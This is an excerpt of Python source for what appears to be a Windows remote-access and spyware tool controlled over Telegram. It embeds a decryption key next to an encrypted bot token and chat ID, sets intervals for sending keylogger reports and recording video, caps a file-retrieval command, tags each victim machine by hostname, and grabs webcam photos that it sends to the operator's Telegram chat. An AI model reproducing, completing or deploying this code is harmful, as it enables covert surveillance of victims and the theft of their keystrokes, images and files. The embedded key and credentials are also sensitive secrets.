...
try:
    ...
    # If pywin32 is not installed, the check will not work, but the script may still start.
    win32api = None
    winerror = None
    win32crypt = None

SECRET_KEY = b'aVuzD_TMheAHemOnvrBvkh8f4A3--rTBuf8ERiTV0nk='
ENCRYPTED_BOT_TOKEN = b'gAAAAABpew-7Q5s64OwOjKVfyFLYqKsm2bj-ZfkkvWf_ouDGcEBVOu-l8OfqTwECnUI4HqL_gxoWFZgZ2SV60gDLQir-QfS-fONjFKouLC6IplvQj2QWreeOdq5NjK08afXh12U8P44u'
ENCRYPTED_CHAT_ID = b'gAAAAABpew-7IIFzBLT7KXpEC-Rg97tXjUtALMzE6Z1qA5f7xqLNxMSti8U6XrRRnxADpJCgfxAVcH4PzEL1uz17lCV-Q1PKPA=='
...
try:
    ...
    print("[LOG] Telegram credentials successfully decrypted.")
except Exception as e:
    print(f"Errore nella decrittografia delle credenziali: {e}")
    sys.exit(1)

# --- Global Settings ---
SEND_REPORT_EVERY = 180  # 3 minutes for keylogger
VIDEO_DURATION = 300  # 5 minutes for video
MAX_FILE_SIZE_MB = 100  # Limit for /getfile
...
MY_ID = ""
def setup_device_id():
    """Initializes or reads the device ID from a file."""
    global MY_ID
    print("[LOG] Starting device ID configuration...")
    try:
        if not os.path.exists(ID_STORAGE_DIR):
            os.makedirs(ID_STORAGE_DIR)
        
        # Check if the device has been uninstalled
        if os.path.exists(ID_FILE_PATH):
            with open(ID_FILE_PATH, 'r') as f:
                content = f.read().strip()
            if content == "uninstalled":
                print("[LOG] Device marked as uninstalled. Exiting.")
                sys.exit(0)
            
            if content:
                MY_ID = content
                print(f"[LOG] Device ID read from file: {MY_ID}")
        
        # If the ID was not loaded, generate a new one
        if not MY_ID:
            print("[LOG] Device ID not found or empty. Generating new ID from hostname.")
            MY_ID = socket.gethostname()
            with open(ID_FILE_PATH, 'w') as f:
                f.write(MY_ID)
    except Exception as e:
        print(f"[ERROR] Unable to set device ID: {e}")
        MY_ID = socket.gethostname()  # Fallback
    print(f"[LOG] Device ID set to: {MY_ID}")
...
def get_system_info():
    print("[LOG] Collecting system information...")
...
def take_camerashot_and_send():
    print("[CMD] Executing take_camerashot_and_send...")

    if camera_lock.locked():
        stop_recording_event.set()
        print("[CMD] Camera busy, interruption signal sent to recording.")

    print("[CMD] Waiting for camera lock to be released...")
    if not camera_lock.acquire(timeout=15):
        send_telegram_message(f"❌ Timeout: Unable to acquire the camera on `{MY_ID}` to take a photo.")
        stop_recording_event.clear()  # Reset the event if we timed out
        return

    print("[CMD] Camera lock acquired. Taking photo.")
    try:
        camera = cv2.VideoCapture(0, cv2.CAP_DSHOW)  # Using CAP_DSHOW can be faster/more stable on Windows
        if not camera.isOpened():
            send_telegram_message(f"❌ Unable to access the webcam on `{MY_ID}`.")
            return
        ...
        if ret:
            ...
            if send_telegram_photo(filename, f"Photo from the webcam of `{MY_ID}`"):
                print(f"[CMD] Webcam photo sent: {filename}")
                os.remove(filename)
            else:
                print(f"[CMD] Failed to send webcam photo: {filename}")
        else:
            send_telegram_message(f"❌ Unable to capture photo from the webcam on `{MY_ID}`.")
    except Exception as e:
        send_telegram_message(f"❌ Webcam error on `{MY_ID}`: {e}")
    finally:
        stop_recording_event.clear()  # Reset the event, we're done with the camera.
        camera_lock.release()
        print("[CMD] Photo taken and camera released.")
